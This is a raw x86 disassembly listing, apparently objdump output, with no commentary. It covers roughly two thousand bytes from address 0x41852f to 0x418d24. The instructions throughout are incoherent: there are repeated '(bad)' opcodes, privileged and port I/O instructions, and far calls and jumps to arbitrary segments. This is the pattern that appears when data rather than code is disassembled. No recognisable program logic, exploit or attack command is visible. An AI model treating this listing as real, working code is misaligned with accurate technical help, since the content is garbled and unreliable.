  41852f:	inc    esp
  418530:	push   es
  418531:	mov    al,ds:0x7e3ea9dc
  418536:	mov    ch,0xe2
  418538:	push   edx
  418539:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41853a:	mov    ch,0x83
  41853c:	push   edx
  41853d:	add    al,0xf1
  41853f:	fimul  WORD PTR [eax-0x24]
  418542:	mov    bl,0xc4
  418544:	xchg   edi,eax
  418545:	sub    ebx,ebp
  418547:	gs mov ebp,0xabd0aef8
  41854d:	adc    ch,BYTE PTR [esi]
  41854f:	inc    edx
  418550:	aam    0x2f
  418552:	push   ss
  418553:	jnp    0x4185c0
  418555:	push   esp
  418556:	and    BYTE PTR ss:[ebp+0x30d37e7e],0x24
  41855e:	fwait
  41855f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418560:	mov    eax,0x5c377c2e
  418565:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418566:	mov    ebp,0x789ca9a4
  41856b:	add    eax,0x2926983e
  418570:	pop    edi
  418571:	or     BYTE PTR [esi],ah
  418573:	and    BYTE PTR [edi-0x2373ec32],ah
  418579:	jmp    0xc17e74e0
  41857e:	add    BYTE PTR ds:0xbbdcfc1e,cl
  418584:	inc    edx
  418585:	push   ds
  418586:	adc    al,0x5
  418588:	mov    ch,0xe1
  41858a:	les    esp,FWORD PTR [ebp-0x10]
  41858d:	sahf   
  41858e:	push   edi
  41858f:	fimul  WORD PTR [edi-0x322591b4]
  418595:	imul   ebx,DWORD PTR [edi+0x0],0x2c
  418599:	add    esi,DWORD PTR [eax+0x5697675a]
  41859f:	mov    DWORD PTR [esp+ebp*2+0x26],esp
  4185a3:	add    cl,BYTE PTR [edx-0x7a]
  4185a6:	inc    eax
  4185a7:	in     eax,0x55
  4185a9:	arpl   WORD PTR ds:0x3417f3,sp
  4185af:	mov    bl,0x3d
  4185b1:	cmp    ebp,DWORD PTR [ebx]
  4185b3:	daa    
  4185b4:	mov    al,ds:0xdebac9b9
  4185b9:	xchg   DWORD PTR [eax+0xb676b0d],esi
  4185bf:	or     BYTE PTR [esp+edx*4],ch
  4185c2:	dec    esi
  4185c3:	fcmovbe st,st(0)
  4185c5:	sub    dh,dl
  4185c7:	mov    edx,gs
  4185c9:	and    ecx,0xdc5d037
  4185cf:	xor    eax,DWORD PTR [eax+0x4e]
  4185d2:	or     DWORD PTR [ecx+0x29],esp
  4185d5:	sbb    ecx,ebx
  4185d7:	sbb    eax,0x9f9c85f9
  4185dc:	mov    bl,0x4c
  4185de:	sti    
  4185df:	sbb    DWORD PTR [ebp+0x43],esp
  4185e2:	dec    eax
  4185e3:	js     0x4185bb
  4185e5:	cmp    DWORD PTR [ecx+0x786a023c],ebx
  4185eb:	and    DWORD PTR [ecx],esi
  4185ed:	sar    DWORD PTR [edx],0x4a
  4185f0:	sbb    al,BYTE PTR [ecx-0x1e4a6bd5]
  4185f6:	sbb    bl,cl
  4185f8:	scas   al,BYTE PTR es:[edi]
  4185f9:	add    cl,BYTE PTR [edx+0x729ed196]
  4185ff:	add    al,0x21
  418601:	push   edx
  418602:	in     eax,dx
  418603:	dec    eax
  418604:	(bad)  
  418605:	pop    edx
  418606:	bound  edi,QWORD PTR ds:0x97b2f73
  41860c:	cld    
  41860d:	das    
  41860e:	mov    bh,0x98
  418610:	pop    esp
  418611:	xlat   BYTE PTR ds:[ebx]
  418612:	sub    ah,BYTE PTR [ebx]
  418614:	inc    edi
  418615:	pushf  
  418616:	pop    esp
  418617:	(bad)  
  418618:	scas   al,BYTE PTR es:[edi]
  418619:	fbld   TBYTE PTR [ebp-0x6a]
  41861c:	mov    DWORD PTR [ebx-0x2d287f94],eax
  418622:	dec    ecx
  418623:	dec    ebp
  418624:	xor    eax,0xa849af7d
  418629:	pop    edx
  41862a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41862b:	arpl   WORD PTR [esi-0x5e],cx
  41862e:	cmp    BYTE PTR [ecx-0x64],cl
  418631:	jp     0x41866d
  418633:	cmc    
  418634:	xor    eax,DWORD PTR [esi+0x26]
  418637:	pop    eax
  418638:	mov    ebp,0x21ad2298
  41863d:	test   eax,0xf157a3da
  418642:	and    BYTE PTR [ecx+edx*2-0x13],al
  418646:	mov    bl,0x9c
  418648:	fnstenv [ebx]
  41864a:	mov    bl,0x8c
  41864c:	call   0x98e7:0xe8e3fd08
  418653:	and    bh,BYTE PTR [edx+0x25]
  418656:	xchg   BYTE PTR [eax+0xc30c6e2],ah
  41865c:	mov    bl,0xb8
  41865e:	jp     0x4186da
  418660:	push   ss
  418661:	daa    
  418662:	mov    esi,0xdaf3b5d9
  418667:	fldl2t 
  418669:	jg     0x41862c
  41866b:	stos   BYTE PTR es:[edi],al
  41866c:	jge    0x4186d0
  41866e:	std    
  41866f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418670:	jecxz  0x418669
  418672:	hlt    
  418673:	addr16 mov eax,ds:0x8384
  418677:	loope  0x418626
  418679:	sbb    ebx,DWORD PTR [edi]
  41867b:	xchg   edi,eax
  41867c:	jno    0x4186d1
  41867e:	repnz lahf 
  418680:	jns    0x4186f4
  418682:	sbb    al,0x9e
  418684:	ret    
  418685:	fs out dx,al
  418687:	mov    al,0x39
  418689:	or     DWORD PTR [edi+0x29],0x31
  41868d:	fmul   QWORD PTR [edi]
  41868f:	das    
  418690:	mov    cl,0x6e
  418692:	pop    edx
  418693:	xor    DWORD PTR [ebx+0x506c768],edx
  418699:	jg     0x41869d
  41869b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41869c:	xor    al,0xe3
  41869e:	mov    al,ds:0xf95e771f
  4186a3:	pop    ebp
  4186a4:	sub    BYTE PTR [ebx],dl
  4186a6:	mov    al,ds:0xe0f96e16
  4186ab:	retf   
  4186ac:	(bad)  
  4186ad:	push   0x553c1221
  4186b2:	jns    0x418639
  4186b4:	in     al,0xc1
  4186b6:	or     al,0x80
  4186b8:	pop    es
  4186b9:	inc    edx
  4186ba:	push   ecx
  4186bb:	inc    eax
  4186bc:	jo     0x4186d1
  4186be:	sub    al,0x16
  4186c0:	arpl   WORD PTR [ecx+0x44],sp
  4186c3:	or     al,0xdf
  4186c5:	mov    ebp,0xc379a301
  4186ca:	adc    ch,cl
  4186cc:	arpl   WORD PTR [esi],di
  4186ce:	mov    DWORD PTR [ebx],ebp
  4186d0:	xchg   ebp,eax
  4186d1:	mov    bl,0xd5
  4186d3:	(bad)  
  4186d4:	repz cmc 
  4186d6:	jg     0x418716
  4186d8:	cli    
  4186d9:	fidivr DWORD PTR [ecx-0x2a92665e]
  4186df:	and    eax,0xec6b6794
  4186e4:	jge    0x4186b2
  4186e6:	mov    DWORD PTR [edi+0x25],ebx
  4186e9:	xchg   BYTE PTR [edi+0xad986d7],dl
  4186ef:	add    al,BYTE PTR [edx+0x62d6ff2a]
  4186f5:	js     0x418713
  4186f7:	pop    eax
  4186f8:	add    ebp,0xc0d04152
  4186fe:	and    eax,0x2448bebe
  418703:	inc    eax
  418704:	sub    BYTE PTR [eax],al
  418706:	shrd   ebx,eax,0x1b
  41870a:	lahf   
  41870b:	sbb    bl,BYTE PTR [ebx]
  41870d:	fimul  WORD PTR [ecx+0x18a94e1d]
  418713:	cmp    esp,DWORD PTR [esi+0x266806ef]
  418719:	adc    DWORD PTR [esi],edx
  41871b:	xor    ebp,DWORD PTR [ebp+0x706b89e]
  418721:	or     DWORD PTR [ecx+esi*8+0x18892ac4],edi
  418728:	sub    dh,BYTE PTR ds:0x22ab6b2f
  41872e:	out    dx,al
  41872f:	jge    0x418733
  418731:	xor    ecx,DWORD PTR [eax-0x7a1d0033]
  418737:	jbe    0x418737
  418739:	ret    0x5b4c
  41873c:	les    esi,FWORD PTR [esi+0x2f]
  41873f:	dec    ebp
  418740:	xchg   esi,eax
  418741:	pop    edi
  418742:	(bad)  
  418744:	or     DWORD PTR [edi-0x76],ecx
  418747:	cli    
  418748:	dec    ebp
  418749:	arpl   WORD PTR [edx-0x43abf989],cx
  41874f:	inc    edx
  418750:	sbb    DWORD PTR [ebx],edi
  418752:	sub    BYTE PTR [ecx+0x1d3661a3],dl
  418758:	dec    ecx
  418759:	stos   BYTE PTR es:[edi],al
  41875a:	sbb    eax,0x9758e5e7
  41875f:	add    BYTE PTR [edi],cl
  418761:	push   ebx
  418762:	xor    BYTE PTR [edx-0x5d],cl
  418765:	push   es
  418766:	sub    eax,0xc2d975bc
  41876b:	xor    eax,0x765cafc6
  418770:	push   0xc5f8b7c3
  418775:	xchg   BYTE PTR [edi+0x79],dh
  418778:	mov    BYTE PTR [edx],ch
  41877a:	ret    0x5a22
  41877d:	inc    edx
  41877e:	into   
  41877f:	jne    0x41877a
  418781:	push   cs
  418782:	inc    ebp
  418783:	les    esp,FWORD PTR [ebx-0x4a7361fb]
  418789:	cld    
  41878a:	and    eax,0xec96572
  41878f:	xor    eax,0xb6e14667
  418794:	ror    BYTE PTR [ebx+0x4d],0x4a
  418798:	test   ecx,ebx
  41879a:	jmp    0x41876d
  41879c:	ret    
  41879d:	xor    eax,0x790097c4
  4187a2:	in     al,dx
  4187a3:	pop    ebx
  4187a4:	push   eax
  4187a5:	adc    bl,BYTE PTR [esi]
  4187a7:	or     BYTE PTR [edx],0xa5
  4187aa:	or     ah,cl
  4187ac:	sbb    dh,BYTE PTR [eax]
  4187ae:	adc    eax,0x4254c8bd
  4187b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187b4:	std    
  4187b5:	dec    edi
  4187b6:	outs   dx,BYTE PTR ds:[esi]
  4187b7:	xlat   BYTE PTR ds:[ebx]
  4187b8:	mov    esp,0x79b0290e
  4187bd:	cmp    eax,0x954ea6a9
  4187c2:	pop    edx
  4187c3:	sub    al,0xe0
  4187c5:	inc    ecx
  4187c6:	retf   
  4187c7:	fisubr WORD PTR [eax+0x4fedd966]
  4187cd:	shl    DWORD PTR [eax+0x9],cl
  4187d0:	retf   0x1722
  4187d3:	add    al,0xa2
  4187d5:	movntq QWORD PTR [ebx],mm1
  4187d8:	xlat   BYTE PTR ds:[ebx]
  4187d9:	out    dx,eax
  4187da:	stos   DWORD PTR es:[edi],eax
  4187db:	mov    DWORD PTR [esi],esp
  4187dd:	pop    ds
  4187de:	push   ebp
  4187df:	loopne 0x4187d1
  4187e1:	int3   
  4187e2:	push   0x7f68a35
  4187e7:	adc    al,0x76
  4187e9:	jo     0x418781
  4187eb:	xchg   BYTE PTR [eax],ah
  4187ed:	and    bh,BYTE PTR [eax]
  4187ef:	jmp    0x70562154
  4187f4:	fiadd  DWORD PTR [edx]
  4187f6:	fld    DWORD PTR [ecx-0x67b6f313]
  4187fc:	xchg   ecx,eax
  4187fd:	out    0x8,eax
  4187ff:	sbb    BYTE PTR [esi],ah
  418801:	inc    ecx
  418802:	dec    eax
  418803:	add    eax,0xc0894659
  418808:	loop   0x418858
  41880a:	pop    ebp
  41880b:	sbb    bl,BYTE PTR [ebp+0x55]
  41880e:	push   eax
  41880f:	fcom   QWORD PTR [ebx+0x26]
  418812:	inc    ebx
  418813:	addr16 aaa 
  418815:	call   0x645d:0xdd34a90f
  41881c:	iret   
  41881d:	mov    eax,0xaf29d871
  418822:	test   DWORD PTR [edi],ebp
  418824:	pop    edx
  418825:	sti    
  418826:	test   eax,0xd765cde6
  41882b:	in     eax,0xcb
  41882d:	sbb    eax,0x91e370
  418832:	retf   
  418833:	pop    es
  418834:	retf   0x5820
  418837:	lds    esi,FWORD PTR [esi+0x200762f8]
  41883d:	imul   edx,DWORD PTR [eax-0x625703f],0x29
  418844:	sbb    eax,0x6e2b3e56
  418849:	clc    
  41884a:	fidiv  DWORD PTR [edi]
  41884c:	cs pop ss
  41884e:	int    0x7
  418850:	bound  ebp,QWORD PTR [edi-0x22]
  418853:	sti    
  418854:	ds dec ebp
  418856:	or     BYTE PTR [ecx-0x7044e76c],cl
  41885c:	xchg   bl,ch
  41885e:	cld    
  41885f:	pop    ebp
  418860:	add    DWORD PTR [ecx-0x4b0e20a1],eax
  418866:	mov    ebp,DWORD PTR [edx-0xf48f5f0]
  41886c:	sub    dh,cl
  41886e:	fistp  WORD PTR [edi+0x13b40b91]
  418874:	rcl    DWORD PTR [ebp+0x55efe203],1
  41887a:	(bad)  
  41887c:	sbb    BYTE PTR [eax+edx*8],0x15
  418880:	and    BYTE PTR [ebp+0x339392ea],dh
  418886:	push   ebp
  418887:	add    al,bh
  418889:	mov    DWORD PTR [ebx],0x8c7c4b1d
  41888f:	xlat   BYTE PTR ds:[ebx]
  418890:	(bad)  
  418891:	xor    ch,cl
  418893:	test   eax,0x6b678986
  418898:	jmp    0xc194:0xe19c2d2e
  41889f:	repz xor dh,BYTE PTR [esi-0x72]
  4188a3:	rol    DWORD PTR ds:0x6a1995f3,1
  4188a9:	mov    dl,0x6d
  4188ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188ac:	inc    ebp
  4188ad:	jp     0x4188ec
  4188af:	stos   BYTE PTR es:[edi],al
  4188b0:	jae    0x4188fd
  4188b2:	pop    ss
  4188b3:	out    dx,eax
  4188b4:	push   ebx
  4188b5:	sub    al,0x7a
  4188b7:	sahf   
  4188b8:	mov    DWORD PTR [eax+0x2f35d7d6],0x3a410284
  4188c2:	imul   ebx,DWORD PTR [edi+0x38da6aab],0x3c
  4188c9:	jnp    0x4188df
  4188cb:	add    al,0x5e
  4188cd:	cmp    ecx,DWORD PTR [esi]
  4188cf:	jne    0x4188cc
  4188d1:	cmc    
  4188d2:	xlat   BYTE PTR ds:[ebx]
  4188d3:	faddp  st(6),st
  4188d5:	lods   eax,DWORD PTR ds:[esi]
  4188d6:	sahf   
  4188d7:	outs   dx,DWORD PTR ds:[esi]
  4188d8:	scas   al,BYTE PTR es:[edi]
  4188d9:	cvtps2pd xmm7,QWORD PTR [ebx+0x36]
  4188dd:	xor    bl,dl
  4188df:	imul   edx,DWORD PTR [ebx-0x3c],0x904da970
  4188e6:	addr16 inc ecx
  4188e8:	jge    0x418946
  4188ea:	pop    ebx
  4188eb:	not    DWORD PTR [ecx]
  4188ed:	call   0x587b26cf
  4188f2:	lahf   
  4188f3:	add    ebx,DWORD PTR [ebp+0x2f7b7686]
  4188f9:	rcr    BYTE PTR [ecx-0x184ac2bc],1
  4188ff:	into   
  418900:	out    0xbc,eax
  418902:	imul   edx,DWORD PTR [edx],0x7f
  418905:	aaa    
  418906:	out    dx,eax
  418907:	pop    esi
  418908:	sahf   
  418909:	adc    al,0x65
  41890b:	or     dl,BYTE PTR [edx]
  41890d:	imul   edx,ecx,0x6e
  418910:	pop    eax
  418911:	test   ah,dh
  418913:	in     eax,dx
  418914:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418915:	and    esp,DWORD PTR [ebx]
  418917:	jbe    0x418993
  418919:	fadd   DWORD PTR ss:[ecx-0x66f6653c]
  418920:	daa    
  418921:	je     0x418903
  418923:	pop    ecx
  418924:	push   ds
  418925:	sbb    al,0xd8
  418927:	xchg   edi,eax
  418928:	pushf  
  418929:	pusha  
  41892a:	or     bl,bh
  41892c:	in     eax,dx
  41892d:	ret    
  41892e:	test   eax,0xc0d1f040
  418933:	or     DWORD PTR [esi],ebx
  418935:	sar    BYTE PTR [esi],cl
  418937:	cmp    al,BYTE PTR [eax-0x279abae6]
  41893d:	imul   ebp,DWORD PTR [ebp+eax*4-0x79],0x10
  418942:	push   ss
  418943:	sub    eax,0xcba08459
  418948:	push   0x2e
  41894a:	add    eax,0x6665c7f0
  41894f:	shr    BYTE PTR ds:0x7e58aa9,0x18
  418956:	mov    ecx,0xd0d7d9c8
  41895b:	xlat   BYTE PTR ds:[ebx]
  41895c:	in     al,0x8e
  41895e:	sub    edi,DWORD PTR [edx]
  418960:	cmp    eax,DWORD PTR [ebx]
  418962:	test   eax,0x63923055
  418967:	cld    
  418968:	mul    BYTE PTR [edx+edi*1+0x3eb87590]
  41896f:	iret   
  418970:	inc    edi
  418971:	cld    
  418972:	jmp    0x4189cd
  418974:	pop    ebp
  418975:	rcr    BYTE PTR [esi+0x428ced35],cl
  41897b:	adc    ebx,DWORD PTR ds:0xacb48eff
  418981:	fist   WORD PTR [ebx]
  418983:	jo     0x41896e
  418985:	cmp    ah,BYTE PTR [edx-0xa6a7d9f]
  41898b:	shr    al,cl
  41898d:	fcom   QWORD PTR ds:0x7b62daee
  418993:	dec    ebp
  418994:	addr16 sub al,0x9
  418997:	scas   al,BYTE PTR es:[edi]
  418998:	sub    al,0x5c
  41899a:	pushf  
  41899b:	jmp    0x6e5fe509
  4189a0:	int    0x36
  4189a2:	jbe    0x4189c7
  4189a4:	add    eax,0x3ca3efdf
  4189a9:	and    ebx,DWORD PTR [ecx+0x4123ebf0]
  4189af:	pop    edi
  4189b0:	fucomp st(3)
  4189b2:	retf   0xb78d
  4189b5:	outs   dx,DWORD PTR ds:[esi]
  4189b6:	es dec esi
  4189b8:	add    al,0x7
  4189ba:	xchg   edi,eax
  4189bb:	or     eax,0x20de0141
  4189c0:	xchg   edx,esp
  4189c2:	popf   
  4189c3:	mov    eax,ds:0x46963792
  4189c8:	mov    edx,0xdf5de3cf
  4189cd:	pop    ebp
  4189ce:	lock jnp 0x418982
  4189d1:	push   ss
  4189d2:	and    al,0x97
  4189d4:	inc    edi
  4189d5:	das    
  4189d6:	add    DWORD PTR [esp+esi*8+0xbfc157b],edi
  4189dd:	jg     0x4189e9
  4189df:	sbb    eax,0x154dc573
  4189e4:	inc    esi
  4189e5:	ss call 0x80583619
  4189eb:	cs jmp 0x6154:0x2d83f4bd
  4189f3:	xchg   ecx,eax
  4189f4:	js     0x418a62
  4189f6:	and    DWORD PTR [ecx-0x6cc3e6f],edx
  4189fc:	sar    DWORD PTR [edx-0x7a],1
  4189ff:	sub    DWORD PTR [eax],eax
  418a01:	xor    ecx,eax
  418a03:	leave  
  418a04:	pop    edx
  418a05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a06:	mov    edx,0x66053e96
  418a0b:	pop    ss
  418a0c:	cld    
  418a0d:	mov    eax,DWORD PTR [edx-0x41]
  418a10:	push   0x3a7ece8f
  418a15:	int3   
  418a16:	push   eax
  418a17:	xor    DWORD PTR gs:[ebx-0x17b5c252],esp
  418a1e:	or     BYTE PTR [ebp-0x57],al
  418a21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a22:	push   ss
  418a23:	jae    0x418a29
  418a25:	(bad)  
  418a26:	mov    ch,0x7
  418a28:	adc    DWORD PTR [eax+0x25],eax
  418a2b:	sub    BYTE PTR [eax-0x5f034fed],0xbe
  418a32:	adc    esi,ebx
  418a34:	addr16 nop
  418a36:	aad    0x20
  418a38:	sbb    BYTE PTR [ebx],dl
  418a3a:	sub    eax,0x2d0de2f4
  418a3f:	loop   0x4189e2
  418a41:	adc    eax,0x457ad3ad
  418a46:	jg     0x418aaf
  418a48:	mov    al,ds:0xb4a2241c
  418a4d:	mov    ds:0x1187fcf8,eax
  418a52:	cdq    
  418a53:	out    dx,eax
  418a54:	das    
  418a55:	in     eax,0x5a
  418a57:	sbb    DWORD PTR [ebx-0x989415f],ecx
  418a5d:	sub    BYTE PTR [edi+0x26],cl
  418a60:	jmp    0xe3dbb567
  418a65:	push   cs
  418a66:	inc    ecx
  418a67:	xchg   ebp,eax
  418a68:	loope  0x418a06
  418a6a:	or     ebx,DWORD PTR [ecx]
  418a6c:	mov    dl,0x72
  418a6e:	xor    edx,edx
  418a70:	xchg   ebp,eax
  418a71:	and    eax,0x5752ea45
  418a76:	ds int3 
  418a78:	or     DWORD PTR [eax-0xbfc1c48],edx
  418a7e:	scas   al,BYTE PTR es:[edi]
  418a7f:	lahf   
  418a80:	in     eax,dx
  418a81:	xchg   DWORD PTR [edx+0x9],ebp
  418a84:	and    esp,DWORD PTR [ecx+ebp*1+0x1810a5bc]
  418a8b:	jo     0x418ae0
  418a8d:	out    dx,al
  418a8e:	jecxz  0x418a65
  418a90:	in     al,0xff
  418a92:	or     ecx,ebp
  418a94:	adc    BYTE PTR [ebp+ecx*1-0x69cd4cfd],al
  418a9b:	inc    eax
  418a9c:	xor    eax,0x1fa80647
  418aa1:	addr16 inc ebp
  418aa3:	inc    ecx
  418aa4:	dec    ebx
  418aa5:	fcom   QWORD PTR [eax]
  418aa7:	adc    edx,DWORD PTR [ebp+ebp*2-0x5773385]
  418aae:	or     al,0x62
  418ab0:	scas   eax,DWORD PTR es:[edi]
  418ab1:	test   eax,0xe52dbfcc
  418ab6:	sar    DWORD PTR [esi],0xb2
  418ab9:	mov    ebp,0xd0889fa4
  418abe:	loopne 0x418ac7
  418ac0:	inc    esi
  418ac1:	xchg   esp,eax
  418ac2:	and    DWORD PTR [ebx+0x15645a0b],0xffffffcf
  418ac9:	xor    BYTE PTR ss:[edi+0x6d513f51],bh
  418ad0:	sbb    BYTE PTR [ebp+0x4678c249],bl
  418ad6:	add    eax,0xfe29f45f
  418adb:	or     al,0x70
  418add:	xchg   edx,eax
  418ade:	xchg   ebp,eax
  418adf:	ins    DWORD PTR es:[edi],dx
  418ae0:	mov    cl,0x3d
  418ae2:	sbb    al,0x87
  418ae4:	jb     0x418b2d
  418ae6:	xlat   BYTE PTR ds:[ebx]
  418ae7:	dec    esi
  418ae8:	aad    0x17
  418aea:	paddsw mm4,QWORD PTR [ecx-0xc]
  418aee:	sub    al,0x1e
  418af0:	out    dx,eax
  418af1:	stos   BYTE PTR es:[edi],al
  418af2:	jle    0x418a74
  418af4:	or     al,BYTE PTR [ebx+0x76]
  418af7:	xchg   ecx,eax
  418af8:	sahf   
  418af9:	inc    edx
  418afa:	(bad)  
  418afb:	into   
  418afc:	push   0xffffff96
  418afe:	dec    ebx
  418aff:	sub    edx,esi
  418b01:	push   ebx
  418b02:	mov    DWORD PTR [esi+0x4b38f13d],0x68f7109e
  418b0c:	pop    esp
  418b0d:	xchg   ebp,eax
  418b0e:	gs jle 0x418b01
  418b11:	xchg   ecx,eax
  418b12:	jecxz  0x418af1
  418b14:	retf   0x63e
  418b17:	and    eax,0xb581503f
  418b1c:	dec    esp
  418b1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b1e:	call   0xdcb71124
  418b23:	cmp    dl,BYTE PTR [ebx+0x2f]
  418b26:	pop    eax
  418b27:	in     al,dx
  418b28:	test   DWORD PTR [esi+edx*2-0x79e2047e],ecx
  418b2f:	push   cs
  418b30:	loope  0x418ada
  418b32:	xchg   ebp,eax
  418b33:	repz push esp
  418b35:	in     eax,0xa0
  418b37:	inc    esp
  418b38:	jae    0x418bad
  418b3a:	jnp    0x418ad7
  418b3c:	cwde   
  418b3d:	retf   0x9912
  418b40:	xor    al,0xc
  418b42:	push   ebp
  418b43:	lds    esi,FWORD PTR [edi-0x67]
  418b46:	sub    al,0x3f
  418b48:	jnp    0x418b13
  418b4a:	cmp    al,0x30
  418b4c:	add    eax,0xb043b1f6
  418b51:	cld    
  418b52:	mov    eax,0x4bdabca2
  418b57:	clc    
  418b58:	sti    
  418b59:	lods   al,BYTE PTR ds:[esi]
  418b5a:	dec    esi
  418b5b:	ins    BYTE PTR es:[edi],dx
  418b5c:	iret   
  418b5d:	jnp    0x418bb6
  418b5f:	pop    ds
  418b60:	call   0xbca0:0x9a8cae55
  418b67:	cld    
  418b68:	push   edx
  418b69:	ret    
  418b6a:	or     DWORD PTR [eax],esp
  418b6c:	jmp    0xc25190e4
  418b71:	leave  
  418b72:	sbb    DWORD PTR ds:0x6a38180a,esi
  418b78:	and    ah,BYTE PTR ds:0x5182fc83
  418b7e:	inc    edi
  418b7f:	xor    edx,ecx
  418b81:	adc    al,BYTE PTR ds:0x6fdc7cf7
  418b87:	mov    bl,0x2
  418b89:	out    0x5c,al
  418b8b:	rcl    BYTE PTR [edi-0x5132dafa],0x97
  418b92:	xlat   BYTE PTR ds:[ebx]
  418b93:	ror    DWORD PTR [edx-0x7b4880bd],cl
  418b99:	jle    0x418bc5
  418b9b:	call   0x9068:0x754ddecc
  418ba2:	outs   dx,DWORD PTR ds:[esi]
  418ba3:	retf   0x4578
  418ba6:	mov    ds:0x15547570,eax
  418bab:	cli    
  418bac:	adc    BYTE PTR [esi-0x7c680c7b],al
  418bb2:	pop    edx
  418bb3:	into   
  418bb4:	xor    bl,BYTE PTR [edx-0x1a21ec3b]
  418bba:	cmp    eax,0xf6521618
  418bbf:	fsub   DWORD PTR [ecx-0x7ed57352]
  418bc5:	push   0x6d23e92f
  418bca:	xchg   ebp,eax
  418bcb:	xchg   edi,eax
  418bcc:	xor    ebp,edi
  418bce:	mov    ch,0x68
  418bd0:	shr    al,0x27
  418bd3:	adc    ecx,DWORD PTR [edx-0x25af5273]
  418bd9:	hlt    
  418bda:	jmp    0x418bf0
  418bdc:	mov    edi,ebp
  418bde:	scas   eax,DWORD PTR es:[edi]
  418bdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418be0:	retf   
  418be1:	ja     0x418ba5
  418be3:	xchg   edx,eax
  418be4:	call   0xec42:0x85641e5b
  418beb:	(bad)  
  418bec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bed:	push   esi
  418bee:	test   bh,dl
  418bf0:	ror    DWORD PTR [edi+0x8],1
  418bf3:	retf   
  418bf4:	mov    al,ds:0x48295d96
  418bf9:	add    DWORD PTR [eax+0x121a1033],ebp
  418bff:	mov    DWORD PTR [ebx+0x6bdf5bdd],0x99ccdae7
  418c09:	push   0xc3863199
  418c0e:	xchg   DWORD PTR [esi-0x34ef3d75],ecx
  418c14:	out    dx,eax
  418c15:	inc    ebp
  418c16:	inc    esi
  418c17:	xchg   ebx,eax
  418c18:	outs   dx,BYTE PTR ds:[esi]
  418c19:	and    BYTE PTR [ecx-0x6a59587],ch
  418c1f:	gs nop
  418c21:	(bad)  
  418c23:	retf   0xf379
  418c26:	(bad)  
  418c27:	out    dx,eax
  418c28:	test   al,0xa1
  418c2a:	pop    es
  418c2b:	pop    ebp
  418c2c:	popf   
  418c2d:	inc    ebp
  418c2e:	scas   eax,DWORD PTR es:[edi]
  418c2f:	or     cl,al
  418c31:	rol    BYTE PTR [ecx-0x1103e42c],cl
  418c37:	or     ah,BYTE PTR ds:0xa19d0b79
  418c3d:	xchg   esi,eax
  418c3e:	imul   edi,DWORD PTR [esi-0x28],0x48
  418c42:	mov    WORD PTR [esi+0x1],gs
  418c45:	loopne 0x418bd0
  418c47:	rcl    BYTE PTR [ecx+0x36563f5a],1
  418c4d:	mov    ebx,0x64b195e3
  418c52:	mov    dh,0x1b
  418c54:	jb     0x418c8b
  418c56:	xor    eax,0x6f6290b
  418c5b:	lea    esi,[eax+0x28]
  418c5e:	push   es
  418c5f:	pop    es
  418c60:	adc    ebp,DWORD PTR ds:0xc59583fe
  418c66:	mov    ds:0x7067d7cc,al
  418c6b:	popf   
  418c6c:	arpl   WORD PTR [ecx-0x28],bp
  418c6f:	retf   
  418c70:	clc    
  418c71:	mov    al,ds:0xfd7f6dfd
  418c76:	aaa    
  418c77:	sbb    DWORD PTR [ecx+0xe14d22d],ebx
  418c7d:	sahf   
  418c7e:	xor    cl,BYTE PTR [edi+ebx*2]
  418c81:	adc    al,0xfb
  418c83:	test   DWORD PTR [ebx-0x20fc203],edx
  418c89:	mov    WORD PTR [edi+0x2b90d0f5],gs
  418c8f:	and    al,0x4a
  418c91:	xchg   DWORD PTR [ebp+0xd],edi
  418c94:	mov    cs,WORD PTR [ecx+0x47]
  418c97:	sub    eax,0x29d70b24
  418c9c:	popa   
  418c9d:	popf   
  418c9e:	out    0x2e,al
  418ca0:	(bad)  
  418ca1:	pop    ds
  418ca2:	or     eax,DWORD PTR [edi+0x33b9a793]
  418ca8:	ret    
  418ca9:	add    al,0x77
  418cab:	xchg   esp,eax
  418cac:	inc    esi
  418cad:	inc    ecx
  418cae:	and    cl,BYTE PTR [edi]
  418cb0:	sub    BYTE PTR [edx],cl
  418cb2:	jmp    0x418d1d
  418cb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418cb5:	mov    dh,0xcf
  418cb7:	or     al,0xbb
  418cb9:	mov    edx,0xa65ff644
  418cbe:	xchg   ebp,eax
  418cbf:	jmp    0x9c66:0x2a454089
  418cc6:	retf   0x648e
  418cc9:	adc    bh,BYTE PTR [edi]
  418ccb:	pop    ss
  418ccc:	mov    es,ebx
  418cce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ccf:	cdq    
  418cd0:	in     al,dx
  418cd1:	fs mov esp,0xcb817e54
  418cd7:	jecxz  0x418c72
  418cd9:	int3   
  418cda:	(bad)  
  418cdc:	call   0x9d59:0xf581
  418ce2:	add    al,0x11
  418ce4:	inc    eax
  418ce5:	int    0x42
  418ce7:	aam    0x66
  418ce9:	outs   dx,BYTE PTR ds:[esi]
  418cea:	mov    edx,0x31aa9a5c
  418cef:	jmp    0x945674a5
  418cf4:	repz xchg edi,eax
  418cf6:	test   BYTE PTR [ecx-0x55],0x3b
  418cfa:	cli    
  418cfb:	test   al,0x57
  418cfd:	je     0x418d0a
  418cff:	fild   WORD PTR [ebp-0x4a]
  418d02:	inc    ebx
  418d03:	inc    edi
  418d04:	jge    0x418cc9
  418d06:	cmp    esi,DWORD PTR [eax-0x1e06ae80]
  418d0c:	aam    0x6e
  418d0e:	dec    ebx
  418d0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d10:	sar    BYTE PTR [eax+0x1d595049],1
  418d16:	test   bl,bh
  418d18:	xor    BYTE PTR [esi-0x60d80117],0x84
  418d1f:	pop    ds
  418d20:	retf   0x5e41
  418d23:	pop    es
  418d24:	xor    al,0xe0
